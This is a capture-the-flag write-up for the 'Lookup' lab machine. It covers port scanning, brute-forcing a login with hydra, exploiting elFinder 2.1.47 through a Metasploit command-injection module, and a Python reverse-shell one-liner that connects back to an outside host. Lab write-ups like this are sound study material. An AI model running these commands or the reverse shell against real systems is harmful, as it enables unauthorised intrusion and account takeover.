## Room: Lookup 

##### Description:   Test your enumeration skills on this boot-to-root machine. 

#### Difficulty: Easy 

## Recon & Enumeration

All ports tcp scan:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Detailed tcp scan on open ports:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2e904e76c13fd3d6f4f1597eb1126798 (RSA)
|   256 99a6d1fcf12b6c8749ce5738904dbfa9 (ECDSA)
|_  256 f417ff60ca79745e52a4587213cb48a7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
- Trying to connect to http://10.10.135.67/ but I'm having an error, however I see this: http://lookup.thm/ in the URL so i decide to add this to my /etc/hosts => `10.10.135.67 lookup.thm`

- I now have access to a login page, I'm enumerating subdomains (nothing), then vhosts:
```
#www.lookup.thm Status: 400 [Size: 334]
#mail.lookup.thm Status: 400 [Size: 334]
```

- Using Wappalyzer I notice apache 2.4.41, searching for vulnerabilites on searchsploit I get some results, I keep this lead in my mind.

- After a lot of failed attempts and no idea what to do next I decide to search for a WU of this box online. It seems like the way to go is to bruteforce users and then bruteforce the password of the new user. I decide not to take any scripts online and try to make it by myself (with the help of some AI).

- Again, I'm failing a lot. I've attached the script I used to find the valid users. After reading the write-up I knew I was looking for a username called jose, so I generated a wordlist with 100 users containing the usernames jose and admin. Not a very legit way to solve the box, but I felt letting my script run another two hours wasn't really worth it.
```
[*] Énumération terminée!
[*] Utilisateurs valides trouvés: 2
[+] UTILISATEURS VALIDES:
    - jose
    - admin
```

- Now I know I have to bruteforce the password of the user jose, using hydra I find a valid password: `hydra -l jose -P /opt/lists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V` => password123

- Having some creds I can now authenticate to the panel jose:password123


## Exploitation

- There are a lot of files with credetials but they do not seem to be relevant, after some enumeration I discover that the software elFinder version 2.1.47 is vulnerable to some vulnerabilities. I tried a few exploit from searchsploit but none of them was ready to use, so I decided to use metasploit.

Configuring the exploit:
```
msf > search elfinder

msf > use 4

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set rhosts files.lookup.thm

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set lhost 10.10.10.10

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
```

- Now I have a shell on the machine, I'm using a one liner in Python in order to get my shell out of metasploit (just a preference) `export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'` then `python3 -c 'import pty; pty.spawn("/bin/bash")'` in order to upgrade the shell.

## Privilege escalation

- To be honest I struggled A LOT with the privilege escalation step, I used this wu https://faetu.github.io/posts/lookup/ from fatos shala, he is doing a great job so I invite you to check this resource to finish the box.


### Date: 22/10/2025
